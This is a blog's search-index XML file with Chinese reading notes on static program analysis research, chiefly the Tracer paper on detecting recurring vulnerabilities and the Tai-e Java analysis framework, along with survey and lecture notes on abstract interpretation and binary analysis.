<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>论文笔记:Tracer:Signature-based Static Analysis for Detecting Recurring Vulnerabilities</title>
    <url>/2023/10/15/%E6%95%A3%E8%A8%98-10-14-23/</url>
    <content><![CDATA[<p>阅读论文：Tracer: Signature-based Static Analysis for Detecting Recurring Vulnerabilities</p>
<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>由于开发者很容易在同样的地方踩坑（数学运算，协议等），或者人们对复杂的低级语意的误解（C 语言中的未定义行为等），加之代码重用，致使相似的漏洞重复出现。</p>
<p>代码相似性有一些相关论文，这里记录一下</p>
<ul>
<li>Yaniv David et al. Firmup: Precise static detection of common vulnerabilities in firmware.</li>
<li>Steven H. et al. Asm2vec: Boosting static representation robustness for binary clone search against code obfuscation and compiler optimization</li>
<li>Jiyong Jang et al. Redebug: Finding unpatched code clones in entire os distributions</li>
<li>Seulbae Kim et al. VUDDY: A scalable approach for vulnerable code clone discovery</li>
<li>Jingyue Li et al. Cbcd: Cloned buggy code detector. In 34th International Conference on Software Engineering (ICSE 2012). IEEE Computer Society, 2012</li>
<li>Damien Octeau et al. Combining static analysis with probabilistic models to enable market-scale android inter-component analysis</li>
<li>Nam H Pham et al. Detection of recurring software vulnerabilities</li>
<li>Yang Xiao et al. MVP: Detecting vulnerabilities using patch-enhanced vulnerability signatures</li>
</ul>
<p>作者认为这些工具检测是基于语法匹配的，不能应对语法结构完全不一样却有着相似的漏洞。</p>
<p>作者提出5个要素以评价分析器</p>
<ul>
<li>Accuracy：是否正确报告潜在的漏洞，低误报</li>
<li>Robustness：能否发现同样漏洞的变种</li>
<li>Generality：能否发现很多不同种类的漏洞</li>
<li>Scalability：能否适用于大型程序</li>
<li>Usability：是否有直观可解释的报告</li>
</ul>
<h1 id="Content"><a href="#Content" class="headerlink" title="Content"></a>Content</h1><p><img src="https://i.imgs.ovh/2023/10/15/rwjhs.png" alt="image-20231014190620861"></p>
<p>2009 年，在图像处理软件 gimp 中出现了这么一个整数溢出的漏洞（图1a，第12，13，14行）。 8 年后，相似的漏洞又一次出现在了图像处理软件 sam2p 中（如图1b）。因为对 BMP 处理有着相似的逻辑，这两段代码片段有着相似的逻辑，相似的漏洞<del>（人类总是在同一个地方重蹈覆辙）</del>。</p>
<p>为了发现这样的漏洞，作者提出 Signature-based Static Analysis。经典的方法是直接比较程序的语法（比如函数或者程序块），启发式的方法（VUDDY 和 MVP）选择包含 patches 的函数作为特征。然而这些方法都适对付不了规模较大的、语法差别较大的函数（如图1c），尽管漏洞的本质是一样的。</p>
<p>作者还提到，基于克隆的方法不能高效的通过图1a 的 signature 检出图1b 图1c 的漏洞，通用的整数溢出检测又有很多误报，通过特定的匹配工作量也非常大。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rw4UX.png" alt="image-20231014193732785"></p>
<p>图2 是作者介绍的工具，可以精确的用图1a 中的 signature 检测图1b 和图2c 的漏洞。</p>
<h2 id="Taint-Analysis"><a href="#Taint-Analysis" class="headerlink" title="Taint Analysis"></a>Taint Analysis</h2><p>作者用简单的污点值抽象域 T &#x3D; {⊥𝑡 , ⊤𝑡 } 表示是否可能被污染，⊥𝑡 表示没被污染 , ⊤𝑡 表示可能污点数据。抽象域 I &#x3D; {⊥𝑜, ⊤o} 表示是否可能溢出 ⊤o 可能溢出，⊥𝑜 没溢出。只有同时 ⊤𝑡 和 ⊤o 时才可能存在漏洞。</p>
<h2 id="Traces-on-Data-Dependency-Graphs"><a href="#Traces-on-Data-Dependency-Graphs" class="headerlink" title="Traces on Data Dependency Graphs."></a>Traces on Data Dependency Graphs.</h2><p>这部分是关于需要比较的 signatures 也就是所谓的 Traces 。值得注意的是，作者认为使用数据流依赖图而非控制流依赖图能够避免不相关的表达式。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwd60.png" alt="image-20231014201014209"></p>
<p>作者使用如图3 所示的，从数据流图中提取出的 source 到 sink point 的痕迹。这样的痕迹（Trace）会被作为漏洞的 signature。</p>
<p>然后会尽可能地提取出所有 source 到 sink point 的痕迹。<del>值得注意的是这里他们只展开一次循环</del>。</p>
<h2 id="Feature-Representation"><a href="#Feature-Representation" class="headerlink" title="Feature Representation"></a>Feature Representation</h2><p>这里讲的主要是对语意语法的表达。最终</p>
<p>作者以向量的形式来表示 Trace。</p>
<ul>
<li>Low-Level feature：如图3a 所展示的被 &lt;&gt; 包裹的向量，只表达使用了几次 primitive operator 和 APIs。</li>
<li>High-Level feature：需要手动实现的比如 <strong>IfSmallerThanConst</strong> ，表达 x &lt; const 这种语意。另外，作者✍️手动实现了 5 种语意。</li>
</ul>
<p><del>假如从程序中检出了目标的痕迹，但是没检出 signature 痕迹（这里我认为是指 High-Level feature），那么就认为没有漏洞。</del></p>
<h2 id="Similarity-Checking"><a href="#Similarity-Checking" class="headerlink" title="Similarity Checking"></a>Similarity Checking</h2><p>作者使用余弦函数来表示相似度。以图3 为例。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rw8eC.png" alt="image-20231014203914563"></p>
<p>图3a 和图3b 有着 0.96 的相似度。Tracer 由此检测相似度比较高重复漏洞。</p>
<hr>
<p>接着作者紧随其后描述了上述整个过程的形式化方法，对 ALARM，TAINED TRACE，SCORE OF ALARM 的形式化定义。如果感兴趣可以看一下原文，这里只简描述一下一下形式化的算法和几个定义。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwTMm.png" alt="image-20231014213942829"></p>
<p>从程序中取出 alarm 的集合 （line1）<br>根据程序构建 DFG （line2）<br>对程序的每一个 alram，从中提取出 traces 的集合 （line5）<br>然后把这些 traces 表达成 feature vectors （line6）<br>与 signature traces 的 feature vectors 对比，取相似度最高的 （line7）</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwD9t.png" alt="image-20231014214138539"></p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwqSN.png" alt="image-20231014214156788"></p>
<p><img src="https://i.imgs.ovh/2023/10/15/rw9dR.png" alt="image-20231014214215482"></p>
<p>除此之外，作者还定义了抽象内存，以及一系列在抽象内存上的形式化方法。</p>
<p>作者的动机是在看漏洞报告时发现开发者通常根据一系列操作来描述一个漏洞，如下图所示：</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwNFp.png" alt="image-20231014221330858"></p>
<p>作者把 low-level feature 和 high-level feature 作分离是为了提高效率和精度。</p>
<p>在 Low-Level feature 中，由于每个 Trace 只是由一系列操作组成，为了提高精度</p>
<ul>
<li>只有当分析器报告 alarm（source and sink points ）才会从程序中提取 trace（那一段向量）</li>
<li>使用数据流依赖</li>
</ul>
<p>在 High-Level feature 中，作者设计了如下的特性，进一步提高程序分析的精度。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwahT.png" alt="image-20231014222451704"></p>
<p>以 EqualToPercentage 为例，这个设计也在 MVP 中使用过，在通常的条件表达式中可以避免格式化字符串的错误。尽管作者说在只有 Low-Level feature 的情况下，Trace 的精度已经很高了，使用了 High-Level feature 可以让精度更高。</p>
<h1 id="Evaluate"><a href="#Evaluate" class="headerlink" title="Evaluate"></a>Evaluate</h1><h2 id="Experimental-Setup"><a href="#Experimental-Setup" class="headerlink" title="Experimental Setup"></a>Experimental Setup</h2><p><strong>Implementation</strong>：Tracer 基于 Facebook’s Infer analyzer，使用污点追踪能分析整数上溢，整数下溢，格式化字符串，命令注入，缓冲区溢出，另外用 Pulse engine 能分析UAF，double free。</p>
<p><strong>Signature Program</strong>：Signature Trace 取自 （1）16 个能被污点追踪复现的漏洞以及以前的一些工作。（2）Juliet test suite：包含了很多常见漏洞的小程序，作者使取了 5383 个 Tracer 能分析的漏洞程序。（3）OWASP 中取了 5 个安全编程的例子。</p>
<p><strong>Benchmark</strong>：选取了 273 个 Debian package（C&#x2F;C++） 作为基准测试。</p>
<p><strong>Baseline</strong>：与先进的三类检测工具进行对比（1）clone-based approach（2）learning-based approach（3）pattern-based static analyzer。其中选择了 VUDDY，CCAligner，Devign 和 Github’s CodeQL。</p>
<p><strong>Metrics</strong>：由于不同分析器之间的表现不太一致，比如 CodeQL 只报告 sink point。为了公平比较做了一些考虑。展示 <strong>Root Cases</strong>，以及 <strong>Sink Point</strong>，对于 Tracer 和 CodeQL 比较 true alarm 和 flase alarm，而其他的（VUDDY，CCAligner，Devign）则只记录报告的函数。</p>
<h2 id="RQ1：Effectiveness"><a href="#RQ1：Effectiveness" class="headerlink" title="RQ1：Effectiveness"></a>RQ1：Effectiveness</h2><p>Debian package 中对于尚未被发现的漏洞，作者选取了相似度大于 0.85 的 alarm，在 0.85 以下又随机选取了 100 个报告进行分析，最终产生了 424 份报告。作者写这篇论文时，Tracer 找到了 112 个新漏洞，30个漏洞已经被确认，且收获了 6 个 CVEs。而在这 112 个漏洞中，只有 10 个能被 baseline tools （VUDDY 和 Devign）发现。<del>杀人诛心</del></p>
<p>表2 是 Tracer 发现的漏洞的一部分。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3CPl.png" alt="image-20231014230916024"></p>
<p>false alarm 与 true alarm 的曲线，图中的 0.95 0.90 0.85 表示 Tracer 的相似度。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/rwvUu.png" alt="image-20231014231312405"></p>
<h2 id="RQ2：Comparison"><a href="#RQ2：Comparison" class="headerlink" title="RQ2：Comparison"></a>RQ2：Comparison</h2><p>基于以下事实进行比较，对于所有工具（Tracer85, VUDDY, CCAligner, and CodeQL）作者都会手动分析 Tracer85 产生的 alarm 数量；收集所有工具的真实报警，包括 Tracer 中相似度小于 0.85 随机采样的真实报警。</p>
<p>最终作者收集到 453 个基本事实与其他 baseline 比较。另外，由于 Devign 不提供合适的报告，作者只判断它能否找到 453 其中的事实。</p>
<p>比较的结果如表3 所示。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3P6d.png" alt="image-20231014231329076"></p>
<p>与 VUDDY 和 CCAligner 相比（与 clone-based 方法相比）。VUDDYO 使用了原来的数据库，VUDDYS 使用了与 Tracer 相同的数据库。在 VUDDYO 12 个报告中有 7 个误报，其中只有 3 个漏洞，3 个漏洞中有 1 个 Tracer 没有发现（作者解释说是因为没有相对应的 signature），而其他 2 个如图12 所示。</p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3VeK.png" alt="image-20231015102435111"></p>
<p>对于这两个相似的漏洞，VUDDYO 根据 <code>LibRaw-demosaic-pack-GPL2, CVE-2017-6889</code> 而 Tracer 根据与发现图1b 中的漏洞的 signature 相似度达到 0.92。更说明了尽管图12 与图1b 中展的漏洞有着完全不同的语法结构，Tracer 仍能高效发现这样的漏洞。</p>
<p>VUDDYS 只有 10 个误报。以图13 为例，作者认为到 vfprintf 的格式化字符串输入都是合法的。<del>(单这个图应该看不出来)</del></p>
<p><img src="https://i.imgs.ovh/2023/10/15/r3rMj.png" alt="image-20231015103952666"></p>
<p>CCAligner 发现了 150 个报告但是没有发现漏洞（因为它本来就不是拿来挖洞的），但是对于漏洞挖掘来说，它也存在大量与 VUDDYO 相似的的出现在图13b 中的误报（合法输入）。</p>
<p>与 CodeQL 相比（human-written bug patterns），CodeQL 报告了 3488 个，作者分析了其中 324 个。其中 CodeQL 报告了 453 个事实（前面收集的）中的 161 个真实的报告，而 Tracer85 能发现 253 个。事实上 CodeQL 与 Tracer 相比并不能说明 Tracer 在 signature 匹配上更加好，因为 CodeQL 并没有匹配 signature 而且有着完全不同的架构。这样只说明了 Tracer 与当前比较好的静态分析器相比能也能发现比较重要的漏洞。</p>
<p>对比 Degign（learning-based），作者也使用了两种不同的数据集（与 VUDDY 相似）。Devign𝑂 发现的 10 个漏洞中有 8 个能被 Tracer 发现，而 Devign𝑆 同样一无所获。</p>
<h2 id="RQ3：Impact-of-High-level-Features"><a href="#RQ3：Impact-of-High-level-Features" class="headerlink" title="RQ3：Impact of High-level Features"></a>RQ3：Impact of High-level Features</h2><p><img src="https://i.imgs.ovh/2023/10/15/r32uI.png" alt="image-20231015110816124"></p>
<p>从表4 中可以看出有无 High-Level Features 对精度的影响不大，但是还是有一些提升的。</p>
<h2 id="RQ4：Scalability"><a href="#RQ4：Scalability" class="headerlink" title="RQ4：Scalability"></a>RQ4：Scalability</h2><p><img src="https://i.imgs.ovh/2023/10/15/r3F8V.png" alt="image-20231015111432584"></p>
<p>作者主要从程序的规模和运行的时间来描述。静态分析框架分析平均只要 140.42”，相似度计算平均要 2.71“，对于大部分的包都在 20‘ 内完成。一个花了 53‘ 的例外，作者认为是因为函数指针分析不精准导致分析了太多函数。另一个例子是对 gettext 他们只花了 91“ 就分析完成了 982K 行代码。</p>
<h1 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h1><p>作者开发的 Signature-based Static Analysis 在 273 个 Debian 上发现了 112 个先前未发现的漏洞，其中有 6 个被确认为 CVE。</p>
<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>这是我读的第三篇论文，文章的内容，可能有地方我的理解不太对，或者部分内容详略不够得当，恳请🙇读者批评指正。</p>
<p>难以置信，“只是” 把运算的操作和 APIs 作为一个向量计算相似度，就能发现如此多的漏洞；另一方面只是计算运用了多少次某种运算（基本操作符与APIs）为什么已经能够表示这一段操作了呢，这不应该有一个时序的关系嘛；现在已经过了一段时间了（相比于那次会议，或者说这篇论文接受的时间），上面的漏洞确认怎么样了还不太清楚；另外这篇文章使用了非常多形式化方法来描述污点追踪等操作，看的太吃力了😭我太菜了。</p>
]]></content>
      <categories>
        <category>Notes</category>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>散記</title>
    <url>/2023/10/14/%E6%95%A3%E8%A8%98-10-13-23/</url>
    <content><![CDATA[<blockquote>
<p> 打算早上先看一個視頻，具體瞭解一下抽象解釋的相關概念，下午把 Tracer: Signature-based Static Analysis for Detecting Recurring Vulnerabilities 看了</p>
</blockquote>
<p> SIG-程序分析 技术沙龙 数值程序分析—陈立前（国防科技大学）</p>
<p>不變式（值）生成</p>
<p>抽象解釋：對程序語義進行抽象（近似）的通用理論</p>
<p>Galois 連接</p>
<p>抽象域</p>
<p><img src="https://i.imgs.ovh/2023/10/14/XyLPT.png" alt="image-20231014095701310"></p>
<p>數值抽象域，在其上的析取，合取</p>
<p><img src="https://i.imgs.ovh/2023/10/14/XyPip.png" alt="image-20231014095821500"></p>
<p>多面躰域（綫性不等式域），八邊形域（刻畫+1,-1,0，兩個變量之間的關係）</p>
<p>上近似：無漏報但是可能存在誤報</p>
<p>凸抽象域（綫性抽象域），凸抽象域（區間綫性抽象域，絕對值綫性抽象域）</p>
<p>數值程式分析</p>
<ul>
<li>結合抽象域與SMT的程式分析</li>
<li>軟件中資源使用量上界分析</li>
<li>神經網絡架構中的數值缺陷檢測</li>
</ul>
<p>他人提問:</p>
<ul>
<li>應該選擇什麽樣的抽象域</li>
<li>怎麽去自動化地檢測抽象域的精度</li>
<li>…</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>抽象解释</tag>
        <tag>数值程序分析</tag>
        <tag>抽象域</tag>
      </tags>
  </entry>
  <entry>
    <title>静态分析相关综述笔记</title>
    <url>/2023/10/12/%E6%95%A3%E8%A8%98-10-12-23/</url>
    <content><![CDATA[<p>磕磕绊绊的读了一篇讲静态分析框架的论文，发现自己没有提炼自己的知识，有一种 “哦,原来是这样” 的似懂非懂的傲慢。</p>
<p>读了一些综述，打算把这些东西再梳理一遍。</p>
<p>以下的内容非常散，如果对文章感兴趣又不想看文字，看图片部分就够了。</p>
<h1 id="二进制代码安全分析综述（部分）"><a href="#二进制代码安全分析综述（部分）" class="headerlink" title="二进制代码安全分析综述（部分）"></a>二进制代码安全分析综述（部分）</h1><p>作者主要来自复旦大学的软件学院与上海市数据科学重点实验室</p>
<h2 id="引言-摘"><a href="#引言-摘" class="headerlink" title="引言-摘"></a>引言-摘</h2><p>软件安全分析笼统的说可归类两种</p>
<ul>
<li>源代码级别</li>
<li>二进制级别</li>
</ul>
<p>作者讲了二者的区别，</p>
<blockquote>
<p>二进制级别的代码分析上存在着一定的挑战，首 先软件程序需要从源代码经过编译、优化之后生成二 进制可执行程序，二进制代码可读性降低，且在程序的</p>
<p>编译过程中往往会丢失掉上层的结构和类型等信息 (例如将变量和数据结构存到通用寄存器或者内存中1， 从而导致分析任务更严峻，难度更大;</p>
</blockquote>
<p>有一点点疑问🤔。关于优化后失掉上层的结构和类型等信息。虽然可能失掉了源码级别的符号，但是如果能够还原出部分符号，这个符号是最贴近实际运行的，而且信息量也是非常大的，比如编译期的反射在二进制眼前就是非常直白的存在。再另一个综述中了解到有一篇说可以追踪变量的使用自动的还原出结构体，可能这一篇不够详细。</p>
<p><strong>二进制安全分析按照是否要运行可以分为</strong></p>
<ul>
<li>静态分析</li>
<li>动态分析</li>
<li>静态混合的分析技术</li>
</ul>
<p>静态二进制安全分析技术</p>
<p>静态分析二进制安全技术可以归纳</p>
<ul>
<li>找已知的漏洞–代码相似性分析（Pewny等人2015检测代码相似性跨指令集架构，Feng等人2014二进制代码语意相似性检测，Xu等人2020，Jang等人2021的）</li>
<li>找未知的漏洞–数据流分析，符号验证等方法</li>
</ul>
<p>值得一提，使用神经网络算法精确查找二进制代码的安全漏洞方法也开始使用。</p>
<p><strong>发现高价值漏洞（尚未被发现的漏洞）</strong></p>
<ul>
<li><strong>IntScope</strong>用<strong>符号执行技术</strong>对程序中的数据流进行分析</li>
<li><strong>PiOs</strong> 对ios系统的手机软件进行漏洞检测，对可执行文件构建**控制流图(CFG)**，标记代码中的敏感数据以及可以泄露数据的代码段。</li>
<li><strong>FirmaliceH</strong> 使用<strong>符号验证</strong>的方法，通过对固件软件中可能的申请 权限的敏感控制流进行分析，得出能够到达获得高级权限或者绕过权限的控制流路径</li>
<li>除了对用户程序以及嵌入式程序的 漏洞检测外，日常使用的Linux操作系统、Windows 操作系统以及Apple kemel也存在着一定的漏洞，<strong>DRCHCEKER</strong>、<strong>digtoolH</strong>以及<strong>iDEA</strong>分别使用<strong>一些静态二进制安全分析方法的组合</strong>完成了对上述操作系 统的漏洞检测，主要是针对权限泄露、信息泄露等 漏洞.</li>
</ul>
<p>新势力 ”神经网络、机器学习算法“ –<strong>VESTING</strong>（核心思想：代码相似性）。<strong>Ouyang</strong> 使用 <strong>NLP</strong> 中的深度学习神经网络来进行漏洞检测，其核心是代码相似性分析（<strong>Word2Vec，LSTM</strong>）。</p>
<h2 id="动态二进制安全分析技术"><a href="#动态二进制安全分析技术" class="headerlink" title="动态二进制安全分析技术"></a>动态二进制安全分析技术</h2><p>原因：静态分析无法获得动态信息，分析粒度的的系统级别行为（系统异常处理？这里有一点模糊），导致静态分析灵活性和精度差。</p>
<p>动态二进制安全经常使用插桩技术，经典的工具有 PIN，<strong>DynamoRIO</strong>，<strong>Valgrind</strong>，<strong>DynInst</strong> 和 <strong>Libdetox</strong>。</p>
<p>系统级动态二进制插桩工具，最常见基于<strong>QEMU</strong>，工具有<strong>QTrace</strong>，<strong>Panda</strong>，<strong>PEMU</strong>。</p>
<p>动态污点追踪，<strong>Dytan</strong>，<strong>Minemu</strong>（x86 based），<strong>TaintDroid</strong>（for Android）。</p>
<p>恶意软件检测，<strong>X-Force</strong>（动态二进制插桩，无崩溃模型）。Bernadi 等人提出基于过程挖掘的恶意软件检测方法，系统调用序列作为指纹，训练分类器进行分类。Arora 等人提出网络流量特征+规则分类器。</p>
<p><strong>LOOP</strong> 检测&#x2F;分析<strong>不透明谓词</strong>（运行时不可知）</p>
<p>找到一个比较好的讲<strong>不透明谓词</strong>的例子：</p>
<p><img src="https://i.imgs.ovh/2023/10/12/XtSe3.md.png"></p>
<p><strong>K-Hunt</strong> 检测二进制可执行文件中不安全密钥。原理有点类似污点追踪。</p>
<p><strong>QVMII，Qelt</strong> 系统级动态二进制插桩工具。</p>
<p>动静混合方法不展开了，以下是上面工具的评价。</p>
<p><img src="https://i.imgs.ovh/2023/10/12/Xtu99.png" alt="image-20231011133802185"></p>
<p>作者认为未来有以下挑战</p>
<ul>
<li>精度，效率，代码覆盖率的矛盾</li>
<li>智能化</li>
<li>类型恢复</li>
<li>内核代码安全分析</li>
</ul>
<p>例子比较经典<del>（老</del>，最后关于未来的挑战，感觉角度有一点少。</p>
<h1 id="程序分析研究进展（综述）"><a href="#程序分析研究进展（综述）" class="headerlink" title="程序分析研究进展（综述）"></a>程序分析研究进展（综述）</h1><p>来自软件学报的一篇比较不错的综述</p>
<p>讲解了程序分析的几种技术</p>
<ul>
<li>抽象解释</li>
</ul>
<p>抽象解释中抽象域的概念目前实在难以理解，找到知乎的比较好的文章 <a href="https://zhuanlan.zhihu.com/p/602442089">https://zhuanlan.zhihu.com/p/602442089</a></p>
<ul>
<li>数据流分析</li>
<li>基于摘要的过程间分析</li>
<li>符号执行</li>
<li>动态分析</li>
<li>基于机器学的程序分析</li>
</ul>
<p>需要注意的是这些概念并不是独立的。</p>
<p>面向特定软件的程序分析技术</p>
<ul>
<li>移动应用软件</li>
<li>并发软件</li>
<li>分布式系统</li>
<li>二进制代码（上一篇综述详细描述的）</li>
</ul>
<p>展望</p>
<ul>
<li>面向智能合约的程序分析</li>
<li>面向机器学习的程序分析</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>论文阅读笔记</title>
    <url>/2023/10/08/%E6%95%A3%E8%A8%98-10-8-23/</url>
    <content><![CDATA[<p>今天分享一来自 ISSTA 2023 的静态分析文章。Tai-e: A Developer-Friendly Static Analysis Framework for Java by Harnessing the Good Designs of Classics</p>
<blockquote>
<p>Tian Tan and Yue Li. 2023. Tai-e: A Developer-Friendly Static Analysis Framework for Java by Harnessing the Good Designs of Classics. In Proceedings of the 32nd ACM SIGSOFT International Symposium on Software Testing and Analysis (ISSTA 2023). Association for Computing Machinery, New York, NY, USA, 1093–1105. <a href="https://doi.org/10.1145/3597926.3598120">https://doi.org/10.1145/3597926.3598120</a></p>
</blockquote>
<p>b站上有一个静态分析课程，作者基于 tai-e 设计了一个学习性质的静态分析工具，也是非常的有趣。</p>
<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>比起静态分析本身的知识，我们对静态分析的框架还知之甚少。</p>
<p>作者比较了许多经典的 Java 的静态分析框架比如 **Soot，Wala，Doop，SpotBugs **，从中选择比较好的框架，如果任何一个都不够好，他们会尽可能地提出一种更好的设计。</p>
<p><strong>这是第一篇系统性的关于 Java 静态分析框架的设计与实现的探索。</strong></p>
<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>静态分析在非常多的领域做出贡献，比如检测软件缺陷，安全分析，代码优化，程序理解，它还对研究工作和业界的产品有一定的帮助。</p>
<p>然而，尽管静态分析取得了如此巨大的成就，在过去的几十年里出现了许多有名的框架，这些框架却对于想使用这些 analysis 的开发者并不易于学习。换言之，为了构建一个 developer friendly 静态分析框架，这也是非常困难的，往往是对不同目标比如效率，简易度，可用性的一个权衡。</p>
<p>人们对于代码的框架本身却知之甚少，正如 Soot 作者所言：</p>
<blockquote>
<p>“We have noticed that it is difficult to publish framework papers… We encourage conferences to accept more framework papers.”</p>
</blockquote>
<p>在这方面，作者迈出了一步，讨论了一些静态分析关键组件的一些设计权衡。</p>
<ul>
<li><strong>程序抽象（Program Abstraction）</strong>：需要提供程序抽象模型，包括 IR，类继承等，为了表示所有程序的要素（静态分析所需的要素）</li>
<li><strong>基础分析（Fundamental Analyses）</strong>：为了让程序提供比较 friendly 的分析框架比如控制流和 call graph 的 graph-based 算法和输入程序的内存抽象信息比如 points-to&#x2F;alias relations</li>
<li><strong>新的分析开发（New Analysis Development）</strong>：为开发者留的接口，便于实现入安全分析，异常分析，反射分析等</li>
<li><strong>对多种分析的管理（Multiple Analyses Management）</strong>：它应该提供一种标准的方法去管理多种的 analyses，比如当他们（analyses）要一起工作的时候应该怎么协作</li>
</ul>
<p>考虑了这些，诞生了 Tai-e 这个静态分析框架。 主要有一下的贡献</p>
<p><strong>1.</strong> 讨论了经典的静态分析框架，讨论了其合理性，为构建一个更好的静态分析框架提供了一些有用的材料和观点</p>
<p><strong>2.</strong> Tai-e 开发友好型静态分析框架。遵循 HGDC 原则。出了来自 HGDC 的创新外，Tai-e 还有一些具体的创新设计，比如：</p>
<ul>
<li>使用友好型 IR，比起 Soot 和 Wala 更加的简洁，更易于理解</li>
<li>高效的指针分析，高拓展性</li>
<li>创新型的 analysis 插件，易于开发与整合新的 analysis 比如污点追踪异常分析等</li>
</ul>
<p>Tai-e 最初的目的是有个更 friendly 静态分析框架，使用者的反馈：</p>
<blockquote>
<p>An established professor wrote to us: “My students told me that it is very smooth to write code on Tai-e and Tai-e is significantly better than Soot in usability. “</p>
</blockquote>
<p>他们还调查了一下一些研究牲，他们尽管使用 Soot&#x2F;Wala 的时间更长，他们使用了 Tai-e 后认为 Tai-e 更加的 “easy”。他们很多人在使用 Soot&#x2F;Wala 的过程中提及 functionality 和 debugging 困扰了他们。</p>
<p>很明显 Tai-e 实现了他的目标。</p>
<p><strong>3.</strong> Tai-e 影响比较广，他们有开源的代码(<a href="https://github.com/pascal-lab/Tai-e)%EF%BC%8C%E4%B8%BA%E5%AD%A6%E4%B9%A0%E8%80%85%E8%AE%BE%E8%AE%A1%E7%9A%84%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E3%80%82%E5%90%B8%E5%BC%95%E4%BA%86">https://github.com/pascal-lab/Tai-e)，为学习者设计的静态分析代码。吸引了</a> 26 所大学，R&amp;D teams from  13 companies，104 所大学的学生。<del>（这就是开源的力量嘛doge</del></p>
<h1 id="Program-Abstraction"><a href="#Program-Abstraction" class="headerlink" title="Program Abstraction"></a>Program Abstraction</h1><p>静态分析框架程序抽象模型包括 IR，类型系统，类继承等。接下是对 Tai-e IR 的诠释。</p>
<p>Tai-e 的 IR 很受 Soot 和 Wala 的启发，实现的更加简洁，更便于了解 IR 的隐含信息。<del>（什么 underlying intents of IR，不太理解）</del></p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyHbN.png" alt="image-20231008214548165"></p>
<p>IR 的设计上：Tai-e 区分了赋值表达式的类型</p>
<p>API 设计：在获取表达式时使用了具体的返回类型，避免使用索引</p>
<p>程序元素如值，类型，名字的组织和获取方式：Tai-e 集中了索引变量相关的信息到一个单一接口</p>
<p>在图1中展示了一个 binary statement（e.g.，x&#x3D;y+z），作为一个方法的 processBinary，分别被 Soot，Wala，Tai-e 描述。</p>
<p>Soot 假定了所有的 statement 内部有一个 “&#x3D;” 操作符，叫做 AssignStmt 但是没有显式的区分具体的类型。而，AssignStmt 是一个比较底层（lowest-level）的接口，这就导致他需要在第 5 行进行类型判断以保证类型安全。<del>（实话说我当时学 Tai-e 就是疯狂进行类型判断的）</del>。另外，Soot 总是返回 Value（the highest-level 类型继承接口 ），这就导致它必须要强制转换为别的类型，比如第 8 行的 Local 类型，更有趣的例子是 Soot 提供了 IfStmt 的 &lt;Value getCondition()&gt; ，在获取条件表达式时仍然返回 Value，尽管它已经知道这是返回一定是 ConditionExpr。这些例子隐式的区分了 IR 的设计非常的微妙，但是影响很深刻。</p>
<p>Wala 并没有刚刚 Soot 的问题，因为它采用了另外一种表达变量的策略。使用 30 行中的 getUse() 。但是它这样不直观，而且可能增加了调试成本（当需要变量的信息时）。另外，Wala 使用了另外一个接口 ir 以从 op 中获得变量名和类型，这还增加了学习成本。<del>（ir 这个 simbol table 或许有什么妙用呢）</del> </p>
<p>可以预见 Tai-e 因避免了这几个问题而在简洁度和可以理解性上受益。程序中有很多不同类型的 statements 和 expressions，</p>
<p>另外，Tai-e 还有一些新的 IR 设计使它在某些 analyses 中更加容易被接受。比如关联变量 v 和它的 statement，这样当 v 改变的时候，也能获取到它相应的 statement，做进一步的行动。</p>
<h1 id="Fundamental-Analyses"><a href="#Fundamental-Analyses" class="headerlink" title="Fundamental Analyses"></a>Fundamental Analyses</h1><p>静态分析近似关于怎样抽象语义和运行时环境抽象数据。因此，静态分析框架应该提供基本能力来生成此类控制结构，例如（control flow）控制流和（call graph）调用图。</p>
<h2 id="Pointer-Analysis-Alias-Analysis"><a href="#Pointer-Analysis-Alias-Analysis" class="headerlink" title="Pointer Analysis (Alias Analysis)"></a>Pointer Analysis (Alias Analysis)</h2><p>指针分析时非常基础的静态分析，几乎构建了其他所有。</p>
<p>Soot 提供了上下文不敏感（context-insensitive）指针分析 Spark，它高度的优化并且运行很快。Wala 对个上下文敏感（context-sensitive）指针分析进行了优化。不像 Soot，Wala 和 Tai-e，Doop 在Datalog中完全申明和实现，有着更加的 clever 且 useful 的设计，在最近被考虑为实现 proposed 指针分析算法的主流平台。他们都实现了相似的 **Andersen-style **算法。</p>
<p>在设计 Java 静态分析系统时，有一些关键点需要考虑</p>
<ul>
<li>一个 <strong>representation</strong> 表示 points-to information</li>
<li>一个 <strong>context manager</strong> 以处理上下文敏感（context sensitivity）</li>
<li>一个 <strong>heap manager</strong> 堆管理模型</li>
<li>一个 <strong>solver</strong> 以传播 points-to 信息</li>
<li></li>
</ul>
<p>前两者 Tai-e 和其他的框架有所不同</p>
<h3 id="representation"><a href="#representation" class="headerlink" title="representation"></a>representation</h3><p>Spark 和 Wala 都采用了混合的 points-to set，当 set的大小小于某个具体的值，他就用数组存储，否则使用通常的 bit set 存储。Tai-e 也使用了混合的方法，但是在 bit set 的设计上有一些不一样。</p>
